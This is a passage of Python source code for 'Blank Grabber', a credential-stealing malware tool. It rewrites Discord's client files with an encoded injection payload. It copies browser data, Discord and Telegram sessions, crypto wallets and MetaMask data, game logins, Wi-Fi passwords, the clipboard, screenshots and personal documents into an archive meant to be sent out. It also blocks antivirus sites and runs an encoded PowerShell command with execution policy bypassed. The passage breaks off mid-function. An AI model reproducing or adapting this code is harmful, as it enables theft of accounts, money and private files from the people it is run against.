MTBmKV0hPT0weGNhKXJldHVybjtjb25zdCBvPUJ1ZmZlclt4NygweDEyYSldKFlbeDcoMHg5NCldWzB4MF1bJ2J5dGVzJ10pW3g3KDB4ZTApXSgpLFQ9SlNPTlt4NygweDZlKV0obyksSD1hd2FpdCBleGVjU2NyaXB0KHg3KDB4MTNlKSk7c3dpdGNoKCEhW10pe2Nhc2UgWVsndXJsJ11beDcoMHhhMildKHg3KDB4NzUpKTpsb2dpbihUW3g3KDB4NzUpXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbeDcoMHg3MyldW3g3KDB4YTIpXSgndXNlcnMvQG1lJykmJllbeDcoMHhiMildPT09J1BBVENIJzppZighVFt4NygweDhlKV0pcmV0dXJuO1RbeDcoMHhhMSldJiZlbWFpbENoYW5nZWQoVFsnZW1haWwnXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTtUW3g3KDB4MTNiKV0mJnBhc3N3b3JkQ2hhbmdlZChUW3g3KDB4OGUpXSxUW3g3KDB4MTNiKV0sSClbJ2NhdGNoJ10oY29uc29sZVsnZXJyb3InXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oeDcoMHhkNikpJiZZWydtZXRob2QnXT09PXg3KDB4YmYpOmNvbnN0IFY9cXVlcnlzdHJpbmdbJ3BhcnNlJ10odW5wYXJzZWREYXRhW3g3KDB4ZTApXSgpKTtjY0FkZGVkKFZbJ2NhcmRbbnVtYmVyXSddLFZbeDcoMHgxNDkpXSxWW3g3KDB4ZWQpXSxWW3g3KDB4ODMpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbJ3VybCddW3g3KDB4YTIpXSh4NygweGYxKSkmJllbeDcoMHhiMildPT09eDcoMHhiZik6UGF5cGFsQWRkZWQoSClbeDcoMHgxMDEpXShjb25zb2xlW3g3KDB4N2YpXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oJ2NvbmZpcm0nKSYmWVt4NygweGIyKV09PT14NygweGJmKTppZighY29uZmlnW3g3KDB4MTBhKV0pcmV0dXJuO3NldFRpbWVvdXQoKCk9Pntjb25zdCB4OD14NztuaXRyb0JvdWdodChIKVt4OCgweDEwMSldKGNvbnNvbGVbeDgoMHg3ZildKTt9LDB4MWQ0Yyk7YnJlYWs7ZGVmYXVsdDpicmVhazt9fSksbW9kdWxlW1MoMHgxMmQpXT1yZXF1aXJlKFMoMHgxMDcpKTs=').decode(
                          errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
                  except Exception:
                      return None
                  for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
                      path = os.path.join(os.getenv('localappdata'), dirname)
                      if not os.path.isdir(path):
                          continue
                      for root, _, files in os.walk(path):
                          for file in files:
                              if file.lower() == 'index.js':
                                  filepath = os.path.realpath(
                                      os.path.join(root, file))
                                  if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                                      with open(filepath, 'w', encoding='utf-8') as file:
                                          file.write(code)
                                      check = True
                      if check:
                          check = False
                          yield path

          class BlankGrabber:
              Separator: str = None
              TempFolder: str = None
              ArchivePath: str = None
              Cookies: list = []
              PasswordsCount: int = 0
              HistoryCount: int = 0
              AutofillCount: int = 0
              RobloxCookiesCount: int = 0
              DiscordTokensCount: int = 0
              WifiPasswordsCount: int = 0
              MinecraftSessions: int = 0
              WebcamPicturesCount: int = 0
              TelegramSessionsCount: int = 0
              CommonFilesCount: int = 0
              WalletsCount: int = 0
              ScreenshotTaken: bool = False
              SystemInfoStolen: bool = False
              SteamStolen: bool = False
              EpicStolen: bool = False
              UplayStolen: bool = False
              GrowtopiaStolen: bool = False

              def __init__(self) -> None:
                  self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
                  while True:
                      self.ArchivePath = os.path.join(
                          os.getenv('temp'), Utility.GetRandomString() + '.zip')
                      if not os.path.isfile(self.ArchivePath):
                          break
                  Logger.info('Creating temporary folder')
                  while True:
                      self.TempFolder = os.path.join(
                          os.getenv('temp'), Utility.GetRandomString(10, True))
                      if not os.path.isdir(self.TempFolder):
                          os.makedirs(self.TempFolder, exist_ok=True)
                          break
                  for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
                      thread = Thread(target=func, daemon=daemon)
                      thread.start()
                      Tasks.AddTask(thread)
                  Tasks.WaitForAll()
                  Logger.info('All functions ended')
                  if Errors.errors:
                      with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                          file.write('# This file contains the errors handled successfully during the functioning of the stealer.' +
                                     '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
                  self.SendData()
                  try:
                      Logger.info('Removing archive')
                      os.remove(self.ArchivePath)
                      Logger.info('Removing temporary folder')
                      shutil.rmtree(self.TempFolder)
                  except Exception:
                      pass

              @Errors.Catch
              def StealCommonFiles(self) -> None:
                  if Settings.CaptureCommonFiles:
                      for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                          if os.path.isdir(dir):
                              file: str
                              for file in os.listdir(dir):
                                  if os.path.isfile(os.path.join(dir, file)):
                                      if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                          try:
                                              os.makedirs(os.path.join(
                                                  self.TempFolder, 'Common Files', name), exist_ok=True)
                                              shutil.copy(os.path.join(dir, file), os.path.join(
                                                  self.TempFolder, 'Common Files', name, file))
                                              self.CommonFilesCount += 1
                                          except Exception:
                                              pass

              @Errors.Catch
              def StealMinecraft(self) -> None:
                  if Settings.CaptureGames:
                      Logger.info('Stealing Minecraft related files')
                      saveToPath = os.path.join(
                          self.TempFolder, 'Games', 'Minecraft')
                      userProfile = os.getenv('userprofile')
                      roaming = os.getenv('appdata')
                      minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'),
                                        'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
                      for name, path in minecraftPaths.items():
                          if os.path.isfile(path):
                              try:
                                  os.makedirs(os.path.join(
                                      saveToPath, name), exist_ok=True)
                                  shutil.copy(path, os.path.join(
                                      saveToPath, name, os.path.basename(path)))
                                  self.MinecraftSessions += 1
                              except Exception:
                                  continue

              @Errors.Catch
              def StealGrowtopia(self) -> None:
                  if Settings.CaptureGames:
                      Logger.info('Stealing Growtopia session')
                      growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v)
                                                                          for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
                      saveToPath = os.path.join(
                          self.TempFolder, 'Games', 'Growtopia')
                      multiple = len(growtopiadirs) > 1
                      for index, path in enumerate(growtopiadirs):
                          targetFilePath = os.path.join(path, 'save.dat')
                          if os.path.isfile(targetFilePath):
                              try:
                                  _saveToPath = saveToPath
                                  if multiple:
                                      _saveToPath = os.path.join(
                                          saveToPath, 'Profile %d' % (index + 1))
                                  os.makedirs(_saveToPath, exist_ok=True)
                                  shutil.copy(targetFilePath, os.path.join(
                                      _saveToPath, 'save.dat'))
                                  self.GrowtopiaStolen = True
                              except Exception:
                                  shutil.rmtree(_saveToPath)
                      if multiple and self.GrowtopiaStolen:
                          with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                              file.write(
                                  'Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')

              @Errors.Catch
              def StealEpic(self) -> None:
                  if Settings.CaptureGames:
                      Logger.info('Stealing Epic session')
                      saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
                      epicPath = os.path.join(
                          os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
                      if os.path.isdir(epicPath):
                          loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                          if os.path.isfile(loginFile):
                              with open(loginFile) as file:
                                  contents = file.read()
                              if '[RememberMe]' in contents:
                                  try:
                                      os.makedirs(saveToPath, exist_ok=True)
                                      for file in os.listdir(epicPath):
                                          if os.path.isfile(os.path.join(epicPath, file)):
                                              shutil.copy(os.path.join(
                                                  epicPath, file), os.path.join(saveToPath, file))
                                      shutil.copytree(
                                          epicPath, saveToPath, dirs_exist_ok=True)
                                      self.EpicStolen = True
                                  except Exception:
                                      pass

              @Errors.Catch
              def StealSteam(self) -> None:
                  if Settings.CaptureGames:
                      Logger.info('Stealing Steam session')
                      saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
                      steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v)
                                                                       for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
                      multiple = len(steamPaths) > 1
                      if not steamPaths:
                          steamPaths.append('C:\\Program Files (x86)\\Steam')
                      for index, steamPath in enumerate(steamPaths):
                          steamConfigPath = os.path.join(steamPath, 'config')
                          if os.path.isdir(steamConfigPath):
                              loginFile = os.path.join(
                                  steamConfigPath, 'loginusers.vdf')
                              if os.path.isfile(loginFile):
                                  with open(loginFile) as file:
                                      contents = file.read()
                                  if '"RememberPassword"\t\t"1"' in contents:
                                      try:
                                          _saveToPath = saveToPath
                                          if multiple:
                                              _saveToPath = os.path.join(
                                                  saveToPath, 'Profile %d' % (index + 1))
                                          os.makedirs(_saveToPath, exist_ok=True)
                                          shutil.copytree(steamConfigPath, os.path.join(
                                              _saveToPath, 'config'), dirs_exist_ok=True)
                                          for item in os.listdir(steamPath):
                                              if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                                  shutil.copy(os.path.join(
                                                      steamPath, item), os.path.join(_saveToPath, item))
                                                  self.SteamStolen = True
                                      except Exception:
                                          pass
                      if self.SteamStolen and multiple:
                          with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                              file.write(
                                  'Multiple Steam installations are found, so the files for each of them are put in different Profiles')

              @Errors.Catch
              def StealUplay(self) -> None:
                  if Settings.CaptureGames:
                      Logger.info('Stealing Uplay session')
                      saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
                      uplayPath = os.path.join(
                          os.getenv('localappdata'), 'Ubisoft Game Launcher')
                      if os.path.isdir(uplayPath):
                          for item in os.listdir(uplayPath):
                              if os.path.isfile(os.path.join(uplayPath, item)):
                                  os.makedirs(saveToPath, exist_ok=True)
                                  shutil.copy(os.path.join(uplayPath, item),
                                              os.path.join(saveToPath, item))
                                  self.UplayStolen = True

              @Errors.Catch
              def StealRobloxCookies(self) -> None:
                  if Settings.CaptureGames:
                      Logger.info('Stealing Roblox cookies')
                      saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
                      note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
                      cookies = []
                      browserCookies = '\n'.join(self.Cookies)
                      for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                          cookies.append(match)
                      output = list()
                      for item in ('HKCU', 'HKLM'):
                          process = subprocess.run(
                              'powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                          if not process.returncode:
                              output.append(process.stdout.decode(errors='ignore'))
                      for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                          cookies.append(match)
                      cookies = [*set(cookies)]
                      if cookies:
                          os.makedirs(saveToDir, exist_ok=True)
                          with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                              file.write('{}{}{}'.format(note, self.Separator,
                                                         self.Separator.join(cookies)))
                          self.RobloxCookiesCount += len(cookies)

              @Errors.Catch
              def StealWallets(self) -> None:
                  if Settings.CaptureWallets:
                      Logger.info('Stealing crypto wallets')
                      saveToDir = os.path.join(self.TempFolder, 'Wallets')
                      wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(
                          os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
                      browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(
                          os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
                      for name, path in wallets:
                          if os.path.isdir(path):
                              _saveToDir = os.path.join(saveToDir, name)
                              os.makedirs(_saveToDir, exist_ok=True)
                              try:
                                  shutil.copytree(path, os.path.join(
                                      _saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                                  with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                      file.write(path)
                                  self.WalletsCount += 1
                              except Exception:
                                  try:
                                      shutil.rmtree(_saveToDir)
                                  except Exception:
                                      pass
                      for name, path in browserPaths.items():
                          if os.path.isdir(path):
                              for root, dirs, _ in os.walk(path):
                                  for _dir in dirs:
                                      if _dir == 'Local Extension Settings':
                                          localExtensionsSettingsDir = os.path.join(
                                              root, _dir)
                                          for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                              extentionPath = os.path.join(
                                                  localExtensionsSettingsDir, _dir)
                                              if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                                  try:
                                                      metamask_browser = os.path.join(
                                                          saveToDir, 'Metamask ({})'.format(name))
                                                      _saveToDir = os.path.join(
                                                          metamask_browser, _dir)
                                                      shutil.copytree(
                                                          extentionPath, _saveToDir, dirs_exist_ok=True)
                                                      with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                          file.write(extentionPath)
                                                      self.WalletsCount += 1
                                                  except Exception:
                                                      try:
                                                          shutil.rmtree(_saveToDir)
                                                          if not os.listdir(metamask_browser):
                                                              shutil.rmtree(
                                                                  metamask_browser)
                                                      except Exception:
                                                          pass

              @Errors.Catch
              def StealSystemInfo(self) -> None:
                  if Settings.CaptureSystemInfo:
                      Logger.info('Stealing system information')
                      saveToDir = os.path.join(self.TempFolder, 'System')
                      process = subprocess.run(
                          'systeminfo', capture_output=True, shell=True)
                      output = process.stdout.decode(
                          errors='ignore').strip().replace('\r\n', '\n')
                      if output:
                          os.makedirs(saveToDir, exist_ok=True)
                          with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                              file.write(output)
                          self.SystemInfoStolen = True
                      process = subprocess.run(
                          'getmac', capture_output=True, shell=True)
                      output = process.stdout.decode(
                          errors='ignore').strip().replace('\r\n', '\n')
                      if output:
                          os.makedirs(saveToDir, exist_ok=True)
                          with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                              file.write(output)
                          self.SystemInfoStolen = True

              @Errors.Catch
              def GetDirectoryTree(self) -> None:
                  if Settings.CaptureSystemInfo:
                      Logger.info('Getting directory trees')
                      PIPE = chr(9474) + '   '
                      TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
                      ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
                      output = {}
                      for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                          if os.path.isdir(dir):
                              dircontent: list = os.listdir(dir)
                              if 'desltop.ini' in dircontent:
                                  dircontent.remove('desktop.ini')
                              if dircontent:
                                  process = subprocess.run(
                                      'tree /A /F', shell=True, capture_output=True, cwd=dir)
                                  if process.returncode == 0:
                                      output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[
                                                      3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
                      for key, value in output.items():
                          os.makedirs(os.path.join(self.TempFolder,
                                      'Directories'), exist_ok=True)
                          with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                              file.write(value)
                          self.SystemInfoStolen = True

              @Errors.Catch
              def GetClipboard(self) -> None:
                  if Settings.CaptureSystemInfo:
                      Logger.info('Getting clipboard text')
                      saveToDir = os.path.join(self.TempFolder, 'System')
                      process = subprocess.run(
                          'powershell Get-Clipboard', shell=True, capture_output=True)
                      if process.returncode == 0:
                          content = process.stdout.decode(errors='ignore').strip()
                          if content:
                              os.makedirs(saveToDir, exist_ok=True)
                              with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                                  file.write(content)

              @Errors.Catch
              def GetAntivirus(self) -> None:
                  if Settings.CaptureSystemInfo:
                      Logger.info('Getting antivirus')
                      saveToDir = os.path.join(self.TempFolder, 'System')
                      process = subprocess.run(
                          'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
                      if process.returncode == 0:
                          output = process.stdout.decode(
                              errors='ignore').strip().replace('\r\n', '\n').splitlines()
                          if len(output) >= 2:
                              output = output[1:]
                              os.makedirs(saveToDir, exist_ok=True)
                              with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                                  file.write('\n'.join(output))

              @Errors.Catch
              def GetTaskList(self) -> None:
                  if Settings.CaptureSystemInfo:
                      Logger.info('Getting task list')
                      saveToDir = os.path.join(self.TempFolder, 'System')
                      process = subprocess.run(
                          'tasklist /FO LIST', capture_output=True, shell=True)
                      output = process.stdout.decode(
                          errors='ignore').strip().replace('\r\n', '\n')
                      if output:
                          os.makedirs(saveToDir, exist_ok=True)
                          with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                              tasklist.write(output)

              @Errors.Catch
              def GetWifiPasswords(self) -> None:
                  if Settings.CaptureWifiPasswords:
                      Logger.info('Getting wifi passwords')
                      saveToDir = os.path.join(self.TempFolder, 'System')
                      passwords = Utility.GetWifiPasswords()
                      profiles = list()
                      for profile, psw in passwords.items():
                          profiles.append(f'Network: {profile}\nPassword: {psw}')
                      if profiles:
                          os.makedirs(saveToDir, exist_ok=True)
                          with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                              file.write(self.Separator.lstrip() +
                                         self.Separator.join(profiles))
                          self.WifiPasswordsCount += len(profiles)

              @Errors.Catch
              def TakeScreenshot(self) -> None:
                  if Settings.CaptureScreenshot:
                      Logger.info('Taking screenshot')
                      command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
                      if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                          self.ScreenshotTaken = True

              @Errors.Catch
              def BlockSites(self) -> None:
                  if Settings.BlockAvSites:
                      Logger.info('Blocking AV sites')
                      Utility.BlockSites()
                      Utility.TaskKill('chrome', 'firefox', 'msedge',
                                       'safari', 'opera', 'iexplore')

              @Errors.Catch
              def StealBrowserData(self) -> None:
                  if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
                      return
                  Logger.info('Stealing browser data')
